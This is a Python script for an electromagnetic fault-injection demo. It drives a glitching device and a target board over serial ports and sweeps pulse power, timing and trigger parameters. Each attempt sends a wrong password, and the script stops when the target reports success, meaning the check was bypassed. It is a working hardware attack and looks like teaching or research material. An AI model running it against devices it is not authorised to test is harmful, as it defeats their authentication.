import serial, time, sys
import numpy as np

'''
MasonCC Electromagnetic Fault Injection Demo
'''

'''
Devices
'''
faulter_dev = serial.Serial('/dev/ttyACM1', 115200, timeout=1)
target_dev = serial.Serial('/dev/ttyACM2', 9600, timeout=1)

'''
Glitch Parameters
'''
# fa
tdc_sweep = range(10,40,1)
ttc_sweep = range(50,700,50)

# c
pt_sweep = range(5,6,1)
pp_sweep = np.round(np.arange(0.009,0.013,0.001),2)

# trials per and jitter
trials = 10
jitter = [-2, -1, 0, 1, 2]

# globals
attempts = 0
max_attmepts = 5

def reset_target():
    target_dev.setDTR(False)
    time.sleep(2)
    target_dev.setDTR(True)
    time.sleep(2)
    target_dev.reset_input_buffer()
    target_dev.reset_output_buffer()

def fault_cmd(cmd):
    faulter_dev.write(b'%s\r\n' % cmd)
    faulter_dev.flush()
    time.sleep(0.1)
    return(faulter_dev.read_all())

def arm(pulse_time, pulse_power, trig_delay_cycles, trig_time_cycles):
    fault_cmd(b'd')
    time.sleep(2)
    # Configure energy
    fault_cmd(b'in')
    fault_cmd(b'c')
    fault_cmd(str(pulse_time).encode())
    fault_cmd(str(pulse_power).encode())
    # Configure trigger
    fault_cmd(b'fa')
    fault_cmd(str(trig_delay_cycles).encode())
    fault_cmd(str(trig_time_cycles).encode())
    # Arm
    fault_cmd(b'di')
    fault_cmd(b'a')
    time.sleep(2)
    fault_cmd(b'f')
    # Send password and trigger faulter
    time.sleep(1)
    target_dev.write(b'fakeseedthatisnotcorrectatallandneverwillbe\r\n')
    time.sleep(1)
    # Read target frame
    try:
        return int(target_dev.read(1).decode())
    except:
        return 0
        '''
        global attempts
        if attempts > max_attmepts:
            print("Attempts exceeded, skipping")
            attempts = 0
            return 0
        print(f"Frame not found retrying (this could be the result of a fault) ({attempts}/{max_attmepts})")
        attempts += 1
        time.sleep(1)
        reset_target()
        return arm(pulse_time, pulse_power, trig_delay_cycles, trig_time_cycles)
        '''

def sweep():
    results_so_far = ""
    for pulse_time in pt_sweep:
        for pulse_power in pp_sweep:
            for trig_time_cycles in ttc_sweep:
                for trig_delay_cycles in tdc_sweep:
                    print(f"Trying: delay={trig_delay_cycles}, width={trig_time_cycles}, ptime={pulse_time}, ppower={pulse_power}")
                    for t in range(trials):
                        for d_off in jitter:
                            reset_target()
                            result = arm(pulse_time, pulse_power, max(0, trig_delay_cycles + d_off), trig_time_cycles)
                            results_so_far += str(result)
                            if result == 1:
                                print(f"Success: delay={trig_delay_cycles}, width={trig_time_cycles}, ptime={pulse_time}, ppower={pulse_power}")
                                print(f"Recordings: {results_so_far}")
                                print(target_dev.read_all())
                                sys.exit(0)
                print(f"Recordings: {results_so_far}")

if __name__ == "__main__":
    target_dev.write(b'%s\r\n' % b"badsecret\n")
    fault_cmd(b'd')
    reset_target()
    sweep()